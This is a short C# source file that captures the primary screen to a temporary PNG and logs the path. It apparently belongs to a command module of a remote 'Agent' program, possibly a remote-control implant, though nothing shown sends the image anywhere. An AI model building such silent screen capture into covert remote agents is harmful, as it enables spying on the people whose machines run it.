// Screenshot.cs
// Captures screenshots using System.Drawing

using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using Agent.Utils;

namespace Agent.CommandModules
{
    public static class Screenshot
    {
        public static string Capture()
        {
            try
            {
                string file = Path.GetTempFileName() + ".png";
                using (var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (var g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                    }
                    bmp.Save(file, ImageFormat.Png);
                }
                Logger.Log($"Screenshot saved: {file}");
                return file;
            }
            catch (System.Exception ex)
            {
                Logger.Log($"Screenshot error: {ex.Message}");
                return null;
            }
        }
    }
}
